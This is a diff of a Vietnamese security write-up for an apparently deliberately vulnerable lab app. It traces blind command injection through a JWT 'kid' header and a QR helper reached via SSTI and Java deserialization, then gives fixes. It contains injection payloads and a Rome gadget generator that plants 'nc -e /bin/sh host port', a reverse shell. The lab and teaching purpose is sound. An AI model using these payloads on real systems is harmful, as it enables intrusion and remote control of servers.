@@ -2066,17 +2066,18 @@ Nếu kid đi vào command string rồi chạy qua shell,
 
 | Hạng mục | Giá trị |
 |---|---|
-| Sink chính | `QRCodeHelper.renderQrCode(...)` |
-| Dangerous function | `Runtime.getRuntime().exec(new String[] { "/bin/sh", "-c", command })` |
-| Command | `qrencode -t SVG -o <outputPath> <resolvedContent>` |
-| Source chính | User-controlled `email` được render vào profile QR |
-| Source phụ | Booking QR content qua `promotionCode`, nếu promotion code hợp lệ/chèn được vào DB |
-| Trigger | `GET /api/v1/profile/basic-info` hoặc booking quote/hold/confirm sinh QR |
-| Access | `ROLE_USER` hoặc `ROLE_ADMIN` |
-| Blind signal | Không trả stdout/stderr; quan sát qua delay, file marker, QR file, hoặc side effect |
-| File quan trọng | `QRCodeHelper`, `ProfileViewController`, `UserController`, `BookingRequest`, `BookingServiceImpl` |
+| Số sink command execution | 2 sink |
+| Sink A - chính | `JwtUtils.resolveKeyFromKidCommand(kid)` |
+| Sink B - hidden chain | `QRCodeHelper.renderQrCode(qrContent)` |
+| Dangerous function sink A | `new ProcessBuilder("/bin/sh", "-c", command).start()` |
+| Dangerous function sink B | `Runtime.getRuntime().exec(new String[] { "/bin/sh", "-c", command })` |
+| Source chính của Blind CI | JWT header `kid` trong `Authorization: Bearer <jwt>` |
+| Source vào hidden QR sink | SSTI template gọi `QRCodeHelper`, hoặc Deserialize gadget gọi `BookingRequest.getQrCode()` |
+| Normal business sources | Đã có guard cho signup/update email và booking `quote/hold/confirm` promotion code |
+| Blind signal | Không trả stdout trực tiếp; xác nhận bằng delay, file marker, DNS/OOB, log hoặc side effect |
+| File quan trọng | `JwtUtils`, `QRCodeHelper`, `BookingRequest`, `BookingServiceImpl`, `BookingController`, `AuthController`, `UserController`, `Payload/ModernRomePayloadGenerator.java` |
 
-> **Nhận định:** đây là blind command injection vì input đi vào shell command, nhưng response chỉ trả HTML/JSON chứa QR URL; output command không được trả trực tiếp cho attacker. Khai thác cần quan sát side effect hoặc timing.
+> **Nhận định:** Blind Command Injection chính của WebLab là JWT `kid` injection. `QRCodeHelper` vẫn là command execution sink thật, nhưng hiện được giữ như hidden final sink cho hai chain khác: SSTI và Insecure Deserialization. Các nguồn business bình thường đã được guard để không biến QR sink thành Blind Command Injection chính.
 
 ---
 
@@ -2084,32 +2085,38 @@ Nếu kid đi vào command string rồi chạy qua shell,
 
 ```mermaid
 flowchart TD
-    subgraph ProfileFlow["Profile QR flow"]
-        A["PUT /api/v1/user"]
-        B["User.email persisted"]
-        C["GET /api/v1/profile/basic-info"]
-        D["ProfileViewController.buildProfileModel"]
-        E["Template light_mode.ftl/dark_mode.ftl"]
-        F["memberQr(email)"]
+    subgraph JwtBlindCI["Sink A - JWT kid Blind Command Injection"]
+        A1["HTTP request with Authorization Bearer JWT"]
+        A2["JWT header contains attacker-controlled kid"]
+        A3["JwtUtils.resolveSigningKey(...)"]
+        A4["Unknown kid triggers resolveKeyFromKidCommand(kid)"]
+        A5["command = kidKeyCommandTemplate.replace('{kid}', kid)"]
+        A6["ProcessBuilder('/bin/sh','-c',command).start()"]
+        A7["Side effect, timing, or OOB signal"]
     end
 
-    subgraph BookingFlow["Booking QR flow"]
-        G["POST /api/v1/booking/hold or confirm"]
-        H["BookingRequest.promotionCode"]
-        I["BookingRequest.getQrCode()"]
-        J["buildQrCodeContent()"]
+    subgraph QrHiddenSink["Sink B - QRCodeHelper hidden command sink"]
+        B1["SSTI custom Freemarker template"]
+        B2["Template instantiates/calls QRCodeHelper"]
+        B3["Deserialize Rome ObjectBean gadget"]
+        B4["BookingRequest.getQrCode()"]
+        B5["QRCodeHelper.renderQrCode(qrContent)"]
+        B6["Runtime.exec(['/bin/sh','-c',command])"]
+        B7["QR file/timing/OOB side effect"]
     end
 
-    subgraph Sink["Command sink"]
-        K["QRCodeHelper.renderQrCode(qrContent)"]
-        L["command = qrencode ... + resolvedContent"]
-        M["Runtime.exec(['/bin/sh','-c',command])"]
-        N["Response returns QR URL, not command output"]
+    subgraph Guards["Normal business source guards"]
+        G1["/api/v1/auth/signup strict email guard"]
+        G2["PUT /api/v1/user strict email guard"]
+        G3["/booking/quote,/hold,/confirm promotionCode guard"]
     end
 
-    A --> B --> C --> D --> E --> F --> K
-    G --> H --> I --> J --> K
-    K --> L --> M --> N
+    A1 --> A2 --> A3 --> A4 --> A5 --> A6 --> A7
+    B1 --> B2 --> B5
+    B3 --> B4 --> B5 --> B6 --> B7
+    G1 -. blocks profile email source .-> B5
+    G2 -. blocks profile email source .-> B5
+    G3 -. blocks normal booking promotion source .-> B5
 ```
 
 ---
@@ -2118,22 +2125,92 @@ flowchart TD
 
 ### 3.1. Fuzz dangerous function để tìm sink candidate
 
-Theo rule hiện tại, hướng sink -> source bắt đầu bằng fuzz dangerous functions rồi mới lần ngược về input.
+Theo rule hiện tại, hướng sink -> source bắt đầu bằng fuzz/search dangerous functions trước, sau đó mới trace ngược về input.
 
-| Nhóm fuzz | Pattern cần tìm | Kết quả trong repo | Ý nghĩa |
+| Nhóm fuzz | Pattern cần tìm | Kết quả trong repo | Đánh giá |
 |---|---|---|---|
-| Java command execution | `Runtime.getRuntime().exec`, `ProcessBuilder` | `QRCodeHelper`, `JwtUtils` | Candidate command injection |
-| Shell execution | `"/bin/sh", "-c"` | `QRCodeHelper.renderQrCode`, `JwtUtils.resolveKeyFromKidCommand` | Shell metacharacter có hiệu lực |
-| Concatenated command | `"qrencode ... " + resolvedContent` | `QRCodeHelper.renderQrCode` | User input nằm trong command string |
-| Blind behavior | Không trả process stdout/stderr | `renderQrCode` chỉ trả QR URL | Blind command injection |
-| Template method | `TemplateMethodModelEx.exec(...)` | `QRCodeHelper.exec(...)` | Freemarker gọi helper như function |
+| Java command execution | `Runtime.getRuntime().exec` | `QRCodeHelper.renderQrCode(...)` | Command execution sink B |
+| Java subprocess | `new ProcessBuilder` | `JwtUtils.resolveKeyFromKidCommand(...)` | Command execution sink A |
+| Shell execution | `"/bin/sh", "-c"` | Cả `JwtUtils` và `QRCodeHelper` | Shell metacharacter có hiệu lực |
+| String-built command | `replace("{kid}", kid)` | `JwtUtils` | JWT header đi vào command template |
+| String concatenation | `"qrencode ... " + resolvedContent` | `QRCodeHelper` | QR content đi vào shell command |
+| Template callable | `TemplateMethodModelEx.exec` | `QRCodeHelper.exec(...)` | Freemarker có thể gọi helper như function |
+| Deserialization entry | `ObjectInputStream.readObject()` | `BookingServiceImpl.importDraft(...)` | Gadget có thể gọi getter trước business validation |
 
-Candidate sink:
+Kết quả fuzz có 2 sink cần ghi nhận:
+
+| Sink | File | Function | Vai trò hiện tại |
+|---|---|---|---|
+| Sink A | `src/main/java/org/example/security/JwtUtils.java` | `resolveKeyFromKidCommand(kid)` | Blind Command Injection chính |
+| Sink B | `src/main/java/org/example/util/QRCodeHelper.java` | `renderQrCode(qrContent)` | Hidden final sink cho SSTI + Deserialize |
+
+---
+
+### 3.2. Sink A - JWT `kid` command lookup
+
+Code sink:
+
+```java
+// src/main/java/org/example/security/JwtUtils.java
+String kid = header.getKeyId(); // [SOURCE: attacker-controlled JWT header]
+if (StringUtils.hasText(kid) && !verificationKeys.containsKey(kid)) {
+    Key commandLoadedKey = resolveKeyFromKidCommand(kid);
+    if (commandLoadedKey != null) {
+        return commandLoadedKey;
+    }
+}
+
+private Key resolveKeyFromKidCommand(String kid) {
+    String command = kidKeyCommandTemplate.replace("{kid}", kid); // [COMMAND BUILD]
+
+    Process process = new ProcessBuilder("/bin/sh", "-c", command)
+            .redirectErrorStream(true)
+            .start(); // [SINK]
+    ...
+}
+```
+
+Config command template:
+
+```properties
+app.jwt.kid-key-command-template=${JWT_KID_KEY_COMMAND_TEMPLATE:cat ./jwt-{kid}.pem}
+```
+
+Trace ngược từ sink về source:
+
+```mermaid
+flowchart RL
+    S1["ProcessBuilder('/bin/sh','-c',command).start()"]
+    S2["command = kidKeyCommandTemplate.replace('{kid}', kid)"]
+    S3["resolveKeyFromKidCommand(kid)"]
+    S4["if kid is present and not in verificationKeys"]
+    S5["String kid = header.getKeyId()"]
+    S6["Attacker controls JWT header kid"]
+    S7["Authorization: Bearer <jwt>"]
+
+    S1 --> S2 --> S3 --> S4 --> S5 --> S6 --> S7
+```
+
+Điểm lỗi:
+
+| Điểm | Vì sao nguy hiểm |
+|---|---|
+| `kid` là JWT header | Header do client tự tạo, không phải trust boundary an toàn |
+| Unknown `kid` kích hoạt command lookup | Attacker chỉ cần dùng `kid` không có trong `verificationKeys` |
+| `replace("{kid}", kid)` không validate | Shell metacharacter giữ nguyên |
+| `/bin/sh -c` | `;`, `&&`, `|`, `$()`, backtick có ý nghĩa command |
+| Output không trả về response | Phân loại blind, cần side effect/timing/OOB |
+
+### 3.3. Sink B - `QRCodeHelper.renderQrCode(qrContent)`
+
+Code sink:
 
 ```java
 // src/main/java/org/example/util/QRCodeHelper.java
 public String renderQrCode(String qrContent) {
-    String resolvedContent = qrContent == null || qrContent.isBlank() ? "anonymous-member" : qrContent;
+    String resolvedContent = qrContent == null || qrContent.isBlank()
+            ? "anonymous-member"
+            : qrContent;
     String filename = "QR-" + Integer.toHexString(resolvedContent.hashCode()) + ".svg";
     Path outputDir = Paths.get(resolveUploadDir(), QR_UPLOAD_SUBDIR).toAbsolutePath().normalize();
     Path outputPath = outputDir.resolve(filename).normalize();
@@ -2145,86 +2222,146 @@ public String renderQrCode(String qrContent) {
 }
 ```
 
-Vì command chạy qua `/bin/sh -c`, các ký tự như `;`, `#`, `&&`, `|`, `$()` trong `resolvedContent` có thể đổi nghĩa command.
+`QRCodeHelper` còn expose cho Freemarker:
 
-### 3.2. Từ sink lần ngược ra Profile source
+```java
+@Override
+public Object exec(List arguments) throws TemplateModelException {
+    if (arguments.isEmpty()) {
+        return "";
+    }
 
-Freemarker template gọi QR helper bằng `email`:
+    return renderQrCode(toPlainString((TemplateModel) arguments.get(0)));
+}
+```
+
+Trace ngược từ QR sink về hai source hợp lệ hiện tại:
+
+```mermaid
+flowchart RL
+    Q1["Runtime.exec(['/bin/sh','-c',command])"]
+    Q2["command = 'qrencode ... ' + resolvedContent"]
+    Q3["QRCodeHelper.renderQrCode(qrContent)"]
+
+    T1["Freemarker template calls QRCodeHelper"]
+    T2["SSTI / custom profile theme controls template body"]
+
+    D1["BookingRequest.getQrCode()"]
+    D2["Rome ObjectBean invokes getter during hash/toString path"]
+    D3["ObjectInputStream.readObject() in draft import"]
+    D4["Serialized payload from attacker"]
+
+    Q1 --> Q2 --> Q3
+    Q3 --> T1 --> T2
+    Q3 --> D1 --> D2 --> D3 --> D4
+```
+
+Normal business paths đã được guard:
+
+| Business path | Guard hiện tại | Tác dụng |
+|---|---|---|
+| `POST /api/v1/auth/signup` | `SAFE_SIGNUP_EMAIL` trong `AuthController` | Không cho tạo email chứa shell metacharacter |
+| `PUT /api/v1/user` | `SAFE_PROFILE_QR_EMAIL` trong `UserController` | Không cho update email thành payload command |
+| `POST /api/v1/booking/quote` | `rejectUnsafeBusinessPromotionCode(...)` | Chặn promotionCode ngoài `^[A-Z0-9_-]{1,32}$` |
+| `POST /api/v1/booking/hold` | `rejectUnsafeBusinessPromotionCode(...)` | Chặn QR booking source thường |
+| `POST /api/v1/booking/confirm` | `rejectUnsafeBusinessPromotionCode(...)` | Chặn direct confirm QR source thường |
+| `POST /api/v1/booking/draft/import` | Không dùng guard controller | Giữ Deserialize lab flow |
+| Freemarker custom theme | Không lọc trong helper | Giữ SSTI lab flow |
+
+---
+
+## 4. Source -> Sink
+
+### 4.1. JWT `kid` source -> sink
+
+```mermaid
+sequenceDiagram
+    actor Attacker
+    participant API as Any JWT-protected API
+    participant Filter as AuthTokenFilter
+    participant Jwt as JwtUtils
+    participant Resolver as SigningKeyResolver
+    participant Shell as /bin/sh -c
+
+    Attacker->>API: Authorization: Bearer token with injected kid
+    API->>Filter: Extract bearer token
+    Filter->>Jwt: validateJwtToken(token)
+    Jwt->>Resolver: Resolve signing key from JWT header
+    Resolver->>Resolver: header.getKeyId()
+    Resolver->>Jwt: resolveKeyFromKidCommand(kid)
+    Jwt->>Shell: cat ./jwt-{kid}.pem after string replace
+    Shell-->>Jwt: stdout used as key material or side effect only
+    Jwt-->>Filter: token valid/invalid after side effect
+```
+
+Payload shape:
+
+```json
+{
+  "alg": "RS256",
+  "kid": "missing; touch /tmp/weblab-jwt-kid-ci; #",
+  "typ": "JWT"
+}
+```
+
+Expected blind signal:
+
+| Signal | Ý nghĩa |
+|---|---|
+| `/tmp/weblab-jwt-kid-ci` xuất hiện | `kid` đã đi vào shell |
+| Response có thể vẫn là 401/403 | Side effect xảy ra trong key resolution trước khi auth hoàn tất |
+| `kid = missing; sleep 5; #` làm response chậm | Time-based blind signal |
+| OOB/DNS callback | Dùng khi không đọc được filesystem/log |
+
+### 4.2. SSTI source -> QRCodeHelper sink
+
+Freemarker theme mặc định vẫn có callable helper:
 
 ```ftl
 <#assign memberQr = "org.example.util.QRCodeHelper"?new()>
 <#assign memberQrUrl = memberQr(email)>
 ```
 
-Profile model đưa `email` vào template:
+Với SSTI/custom template, attacker không cần đi qua email business field; template có thể gọi helper trực tiếp với nội dung do attacker đặt trong template.
 
-```java
-// src/main/java/org/example/controller/ProfileViewController.java
-private Map<String, Object> buildProfileModel(User user) {
-    Map<String, Object> model = new HashMap<>();
-    model.put("name", valueOrDefault(user.getName()));
-    model.put("email", valueOrDefault(user.getEmail())); // [SOURCE TO TEMPLATE]
-    ...
-    return model;
-}
+```mermaid
+sequenceDiagram
+    actor Attacker
+    participant Profile as GET /api/v1/profile/basic-info
+    participant Loader as CustomThemeLoader
+    participant FTL as Freemarker template
+    participant QR as QRCodeHelper
+    participant Shell as /bin/sh -c
+
+    Attacker->>Profile: Select/poison custom theme path
+    Profile->>Loader: loadProfileTheme(themeName, model)
+    Loader->>FTL: Process attacker-controlled template
+    FTL->>QR: new QRCodeHelper().exec(payload)
+    QR->>Shell: qrencode -t SVG -o file <payload>
+    Shell-->>QR: side effect only
+    QR-->>FTL: /uploads/qrcodes/QR-xxx.svg
 ```
 
-Route trigger:
-
-```java
-// src/main/java/org/example/controller/ProfileViewController.java
-@GetMapping(value = "/api/v1/profile/basic-info", produces = MediaType.TEXT_HTML_VALUE)
-@ResponseBody
-public String basicInfo(@RequestParam(value = "theme", required = false) String theme,
-                        Authentication authentication) {
-    User user = resolveAuthenticatedUser(authentication);
-    String themeName = resolveThemeName(user, theme);
-    return customThemeLoader.loadProfileTheme(themeName, buildProfileModel(user));
-}
-```
-
-Source ghi email:
-
-```java
-// src/main/java/org/example/controller/UserController.java
-@PutMapping
-public ResponseEntity<?> editUser(@RequestBody User user, Authentication authentication) {
-    if (userService.existsById(user.getId())) {
-        if (!canAccessUser(authentication, user.getId())) {
-            return ResponseEntity.status(403).body("Forbidden");
-        }
-
-        User existingUser = userService.findById(user.getId());
-        user.setPassword(existingUser.getPassword());
-        user.setRole(existingUser.getRole());
-        user.setDeleted(existingUser.isDeleted());
-        userService.save(user); // [PERSISTS USER-CONTROLLED EMAIL]
-    }
-}
-```
-
-Điểm đáng chú ý:
+Ghi chú quan trọng:
 
 | Điểm | Ý nghĩa |
 |---|---|
-| `SignupRequest.email` có `@Email` | Signup có validation |
-| `User.email` entity không có `@Email` | Update profile nhận entity trực tiếp |
-| `PUT /api/v1/user` không `@Valid` | Email update không bị DTO validation chặn |
-| `ProfileViewController` dùng email persisted | Stored source kích hoạt khi render profile |
+| Email guard không phá SSTI | SSTI payload nằm trong template, không cần update email |
+| QR helper vẫn tồn tại | `QRCodeHelper` vẫn là final sink cho object-chain/dev-supplied template |
+| Response không trả stdout | Vẫn là blind nếu dùng command side effect |
 
-Flow sink -> source:
+### 4.3. Deserialize source -> QRCodeHelper sink
 
-```text
-Runtime.exec('/bin/sh -c qrencode ... ' + resolvedContent)
-<- QRCodeHelper.renderQrCode(qrContent)
-<- Freemarker memberQr(email)
-<- ProfileViewController.buildProfileModel(user.email)
-<- UserController.editUser(@RequestBody User user)
+Deserialization entry:
+
+```java
+// src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+try (ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(draftBytes))) {
+    importedDraft = input.readObject(); // [DESERIALIZE SOURCE]
+}
 ```
 
-### 3.3. Từ sink lần ngược ra Booking source
-
-Booking request build QR content:
+Getter chạm QR sink:
 
 ```java
 // src/main/java/org/example/payload/BookingRequest.java
@@ -2232,187 +2369,148 @@ Booking request build QR content:
 public String getQrCode() {
     return new QRCodeHelper().renderQrCode(buildQrCodeContent());
 }
-
-private String buildQrCodeContent() {
-    String promotionPart = promotionCode == null || promotionCode.isBlank()
-            ? "NO_PROMOTION"
-            : promotionCode.trim();
-    String transactionPart = transactionIds == null || transactionIds.isEmpty()
-            ? "NO_TRANSACTION"
-            : transactionIds.stream()
-                    .map(String::valueOf)
-                    .collect(Collectors.joining(","));
-
-    String orderPart = orderId == null ? "NO_ORDER" : "ORDER_" + orderId;
-    return orderPart + "+" + transactionPart + "+" + promotionPart; // [QR CONTENT]
-}
 ```
 
-Booking service calls `request.getQrCode()`:
+Rome payload generator hiện đặt command trong `promotionCode`:
 
 ```java
-// src/main/java/org/example/serviceImpl/BookingServiceImpl.java
-return BookingResponse.builder()
-        .transactionIds(transactions.stream().map(Transaction::getId).toList())
-        ...
-        .qrCode(request.getQrCode()) // [TRIGGER QR HELPER]
-        .status(status)
-        .build();
+// Payload/ModernRomePayloadGenerator.java
+BookingRequest bookingRequest = new BookingRequest();
+bookingRequest.setTransactionIds(Collections.singletonList(transactionId));
+bookingRequest.setPromotionCode("; nc -e /bin/sh " + host + " " + port + " #");
+
+ObjectBean innerObjectBean = new ObjectBean(BookingRequest.class, bookingRequest);
+ObjectBean outerObjectBean = new ObjectBean(ObjectBean.class, innerObjectBean);
 ```
 
-Booking source có điều kiện:
+Flow:
 
-| Field | Type | Injection potential |
+```mermaid
+sequenceDiagram
+    actor Attacker
+    participant Import as POST /api/v1/booking/draft/import
+    participant OIS as ObjectInputStream
+    participant Rome as Rome ObjectBean gadget
+    participant Req as BookingRequest
+    participant QR as QRCodeHelper
+    participant Shell as /bin/sh -c
+
+    Attacker->>Import: Upload serialized payload
+    Import->>OIS: readObject()
+    OIS->>Rome: Rebuild HashMap/ObjectBean graph
+    Rome->>Req: Invoke getter path
+    Req->>QR: getQrCode() -> renderQrCode(buildQrCodeContent())
+    QR->>Shell: qrencode command with promotionCode payload
+    Shell-->>QR: side effect / reverse connection / delay
+```
+
+Vì `draft/import` nhận bytes trực tiếp và deserialization xảy ra trước business-level validation, guard ở `/quote`, `/hold`, `/confirm` không chặn chain này.
+
+---
+
+## 5. Phân biệt 2 sink trong report
+
+| Tiêu chí | Sink A - JWT `kid` | Sink B - `QRCodeHelper` |
 |---|---|---|
-| `transactionIds` | `List<Integer>` | Không phù hợp để chèn shell metacharacter |
-| `orderId` | `Integer` | Không phù hợp |
-| `promotionCode` | `String` | Có thể chứa shell metacharacter, nhưng thường phải resolve thành promotion hợp lệ trước khi QR được sinh |
-
-Kết luận: Profile email là source chính ổn định hơn. Booking `promotionCode` là source phụ khi attacker có quyền tạo/chỉnh promotion code hoặc hệ thống đã có promotion code chứa metacharacter.
-
----
-
-## 4. Source -> Sink
-
-### 4.1. Profile email source -> command sink
-
-```mermaid
-sequenceDiagram
-    actor User
-    participant UserAPI as PUT /api/v1/user
-    participant DB as USER table
-    participant ProfileAPI as GET /api/v1/profile/basic-info
-    participant Template as Freemarker theme
-    participant QR as QRCodeHelper
-    participant Shell as /bin/sh -c
-
-    User->>UserAPI: Update email with shell metacharacters
-    UserAPI->>DB: Persist User.email
-    User->>ProfileAPI: Request profile basic-info
-    ProfileAPI->>Template: model.email
-    Template->>QR: memberQr(email)
-    QR->>Shell: qrencode -t SVG -o file <email>
-    Shell-->>QR: side effect, no stdout returned
-    QR-->>Template: /uploads/qrcodes/QR-xxx.svg
-```
-
-API access:
-
-```java
-// src/main/java/org/example/security/WebSecurityConfig.java
-.requestMatchers(HttpMethod.GET, "/api/v1/profile/basic-info").hasAnyRole("USER", "ADMIN")
-.requestMatchers(HttpMethod.PUT, "/api/v1/user").hasAnyRole("USER", "ADMIN")
-```
-
-Why blind:
-
-| Behavior | Blind implication |
-|---|---|
-| `Runtime.exec(...)` stdout không đưa vào response | Không đọc trực tiếp được command output |
-| Response chỉ là profile HTML | Chỉ thấy QR image path |
-| `readError(process)` chỉ dùng cho fallback SVG detail | Không phải channel ổn định cho stdout |
-| `waitFor(3, TimeUnit.SECONDS)` | Có thể quan sát delay/time-based signal |
-| QR file được ghi dưới `/uploads/qrcodes` | Có thể xác nhận qua file/URL nếu owner-check cho phép |
-
-### 4.2. Booking promotion source -> command sink
-
-```mermaid
-sequenceDiagram
-    actor UserOrAdmin
-    participant BookingAPI as POST /api/v1/booking/hold
-    participant Service as BookingServiceImpl
-    participant Request as BookingRequest
-    participant QR as QRCodeHelper
-    participant Shell as /bin/sh -c
-
-    UserOrAdmin->>BookingAPI: BookingRequest with promotionCode
-    BookingAPI->>Service: bookingService.hold(request,userId)
-    Service->>Service: resolvePromotion(request)
-    Service->>Request: request.getQrCode()
-    Request->>QR: renderQrCode(order+transactions+promotionCode)
-    QR->>Shell: qrencode command with resolvedContent
-    Shell-->>QR: side effect only
-```
-
-Điều kiện để path booking khai thác được:
-
-| Điều kiện | Lý do |
-|---|---|
-| `promotionCode` không rỗng | Nếu rỗng, QR content dùng `NO_PROMOTION` |
-| Promotion code phải tồn tại hoặc được admin tạo | `resolvePromotion(...)` throw `Promotion not found` trước khi build QR |
-| Promotion phải pass business validation | `validatePromotion(...)` chạy trước `buildResponse(...)` |
-| Booking route cần JWT | `/api/v1/booking/**` yêu cầu `ROLE_USER` hoặc `ROLE_ADMIN` |
+| Vai trò | Blind Command Injection chính | Hidden command sink cuối |
+| Entry source | JWT header `kid` | SSTI template hoặc serialized gadget |
+| Function nguy hiểm | `ProcessBuilder("/bin/sh", "-c", command)` | `Runtime.exec(new String[]{"/bin/sh","-c",command})` |
+| Input ghép command | `kid` qua command template | `qrContent/resolvedContent` |
+| Output command | Dùng như key material/log, không trả response | Không trả stdout; trả QR URL/HTML/JSON |
+| Business guard | Không có guard trước `kid` sink | Có guard cho email/promotionCode business path |
+| PoC phù hợp | `kid="missing; touch /tmp/x; #"` | SSTI helper call hoặc Rome deserialization payload |
+| Fix chính | Không shell lookup từ `kid`; map/file allowlist; fail closed | Không dùng shell; ProcessBuilder arg-list; không expose helper cho template; filter deserialization |
 
 ---
 
-## 5. Payload kiểm chứng an toàn
+## 6. Payload kiểm chứng an toàn
 
-### 5.1. File marker side effect
+### 6.1. JWT `kid` file marker
 
-Payload shape cho profile email update:
+Header shape:
 
 ```json
 {
-  "id": 1,
-  "email": "member@example.com; touch /tmp/weblab-blind-ci-poc; #",
-  "name": "Member",
-  "phoneNum": "0123456789",
-  "profileTheme": "light_mode.ftl"
+  "alg": "RS256",
+  "kid": "missing; touch /tmp/weblab-jwt-kid-marker; #",
+  "typ": "JWT"
 }
 ```
 
-Trigger:
+Kỳ vọng:
 
-```http
-GET /api/v1/profile/basic-info HTTP/1.1
-Authorization: Bearer <user-jwt>
-```
-
-Expected signal:
-
-| Signal | Ý nghĩa |
+| Kết quả | Diễn giải |
 |---|---|
-| `/tmp/weblab-blind-ci-poc` xuất hiện trên server | Shell command đã chạy |
-| Response vẫn là profile HTML | Không có command output trực tiếp |
-| QR SVG có thể fallback/không đúng QR | `qrencode` command bị tách bởi shell metacharacter |
+| Marker file xuất hiện | Command side effect chạy trong key lookup |
+| Token có thể fail validation | Vẫn là command injection vì side effect xảy ra trước kết luận auth |
+| Không thấy stdout trong response | Blind CI |
 
-### 5.2. Time-based blind signal
-
-Payload shape:
+### 6.2. JWT `kid` time-based
 
 ```text
-member@example.com; sleep 5; #
+kid = missing; sleep 5; #
 ```
 
-Expected signal:
+Kỳ vọng: request bị delay tới gần timeout của key lookup, hoặc log báo `JWT kid key command timed out`.
 
-| Behavior | Ý nghĩa |
-|---|---|
-| Response delay khoảng 3 giây | `waitFor(3, TimeUnit.SECONDS)` chạm timeout |
-| Response vẫn trả QR URL/HTML | Không chứng minh bằng stdout |
-| Process có thể tiếp tục sau timeout | Code hiện tại không `destroyForcibly()` ở nhánh timeout |
+### 6.3. QR hidden sink qua SSTI
 
-### 5.3. Booking path payload shape
+Payload shape trong template lab:
 
-Chỉ dùng nếu promotion code tương ứng tồn tại/pass validation:
-
-```text
-PROMO2026; touch /tmp/weblab-booking-ci-poc; #
+```ftl
+<#assign qr = "org.example.util.QRCodeHelper"?new()>
+${qr("demo; touch /tmp/weblab-qr-ssti-marker; #")}
 ```
 
-Ghi chú: nếu promotion code không tồn tại, flow dừng ở `resolvePromotion(...)` trước khi gọi `request.getQrCode()`.
+Kỳ vọng: response vẫn là HTML/QR URL, marker file hoặc timing chứng minh command side effect.
+
+### 6.4. QR hidden sink qua Deserialize
+
+Payload generator đã dùng `promotionCode` làm command carrier:
+
+```java
+bookingRequest.setPromotionCode("; nc -e /bin/sh " + host + " " + port + " #");
+```
+
+Kỳ vọng: khi import serialized payload, gadget gọi `BookingRequest.getQrCode()`, rồi command trong `QRCodeHelper` chạy trước khi app xử lý business response bình thường.
 
 ---
 
-## 6. Fix guidance đặt cạnh sink
+## 7. Fix guidance đặt cạnh sink
 
-### 6.1. Không dùng shell cho `qrencode`
+### 7.1. Fix Sink A - JWT `kid`
+
+Không dùng `kid` để dựng shell command. `kid` chỉ được là selector vào key store do server kiểm soát:
 
 ```java
-/*
- * FIXED CODE:
- * Pass each command argument separately and do not invoke /bin/sh -c.
- */
+String kid = header.getKeyId();
+if (!StringUtils.hasText(kid) || !kid.matches("^[A-Za-z0-9._-]+$")) {
+    throw new UnsupportedJwtException("Invalid JWT kid");
+}
+
+Key verificationKey = verificationKeys.get(kid);
+if (verificationKey == null) {
+    throw new UnsupportedJwtException("Unknown JWT kid");
+}
+return verificationKey;
+```
+
+Nếu bắt buộc đọc key file, dùng `Path` trong fixed directory và không gọi shell:
+
+```java
+Path keyDir = Paths.get("jwt-keys").toAbsolutePath().normalize();
+Path keyPath = keyDir.resolve(kid + ".pem").normalize();
+if (!keyPath.startsWith(keyDir)) {
+    throw new UnsupportedJwtException("Invalid JWT kid path");
+}
+return parsePublicKey(Files.readString(keyPath, StandardCharsets.US_ASCII));
+```
+
+### 7.2. Fix Sink B - QRCodeHelper
+
+Không chạy `qrencode` qua `/bin/sh -c`; truyền argument tách rời:
+
+```java
 ProcessBuilder processBuilder = new ProcessBuilder(
         "qrencode",
         "-t", "SVG",
@@ -2422,79 +2520,60 @@ processBuilder.redirectErrorStream(true);
 Process process = processBuilder.start();
 ```
 
-### 6.2. Validate QR content trước khi spawn process
+Thêm content policy và timeout fail-closed:
 
 ```java
-/*
- * FIXED CODE:
- * Apply a QR content policy before starting the process.
- */
 if (resolvedContent.length() > 256) {
     throw new IllegalArgumentException("QR content is too long");
 }
 if (!resolvedContent.matches("^[A-Za-z0-9@._,+: -]+$")) {
     throw new IllegalArgumentException("QR content contains unsupported characters");
 }
-```
-
-### 6.3. Quản lý process timeout an toàn
-
-```java
-/*
- * FIXED CODE:
- * Kill timed-out child processes and fail closed.
- */
 if (!process.waitFor(3, TimeUnit.SECONDS)) {
     process.destroyForcibly();
     throw new IllegalStateException("QR generation timed out");
 }
-if (process.exitValue() != 0 || !Files.exists(outputPath)) {
-    throw new IllegalStateException("QR generation failed");
-}
 ```
 
-### 6.4. Fix source validation
+### 7.3. Fix source và chain control
 
-| Source | Fix |
+| Source/chain | Fix |
 |---|---|
-| Profile email update | Dùng DTO có `@Email`, `@Size`, `@Valid`; không bind trực tiếp `User` entity |
-| Promotion code | Whitelist format như `^[A-Z0-9_-]{3,32}$` và validate ở create/update promotion |
-| Freemarker helper | Không instantiate helper bằng `?new()`; inject safe shared variable nếu cần |
-| QR output path | Giữ `outputPath.normalize().startsWith(outputDir)` để tránh path issue nếu filename logic đổi |
+| JWT `kid` | Validate allowlist, lookup từ map/file cố định, unknown `kid` fail closed |
+| Freemarker SSTI | Không cho template tự `?new()` class tùy ý; dùng resolver an toàn và allowlist template |
+| QR helper | Không expose helper nguy hiểm vào template; nếu cần thì expose safe shared variable |
+| Deserialize | Dùng `ObjectInputFilter` chặt hoặc bỏ Java native serialization, chuyển sang JSON DTO |
+| Profile email | Dùng DTO + strict email policy, không bind trực tiếp entity |
+| Booking promotionCode | Whitelist format ở controller và promotion create/update |
 
 ---
 
-## 7. Checklist review nhanh
+## 8. Checklist review nhanh
 
-| Câu hỏi | Kỳ vọng an toàn | Trạng thái hiện tại |
+| Câu hỏi | JWT `kid` sink | QRCodeHelper sink |
 |---|---|---|
-| User input có vào shell command string không? | Không | Có, `resolvedContent` |
-| Command có chạy qua shell không? | Không | Có, `/bin/sh -c` |
-| Output có trả về response không? | Không nên phụ thuộc | Không, nên đây là blind |
-| Có side-effect file không? | Không | Có thể tạo file/QR/marker |
-| Timeout có kill process không? | Có | Không, timeout return QR URL |
-| Source có validation DTO không? | Có | Profile update bind `User` entity trực tiếp |
-| Booking source có điều kiện không? | Nên ghi rõ | Có, `promotionCode` phải hợp lệ trước khi QR render |
+| Input attacker có đi vào command string không? | Có, `kid` | Có, `qrContent` |
+| Command có chạy qua shell không? | Có, `ProcessBuilder('/bin/sh','-c',...)` | Có, `Runtime.exec(['/bin/sh','-c',...])` |
+| Có trả stdout về response không? | Không ổn định/không trực tiếp | Không |
+| Blind signal là gì? | Delay, marker file, OOB, log timeout | Delay, marker file, QR file/OOB |
+| Normal source đã bị guard chưa? | Chưa, vì `kid` là source chính cần giữ vuln | Có, email và promotionCode business paths đã guard |
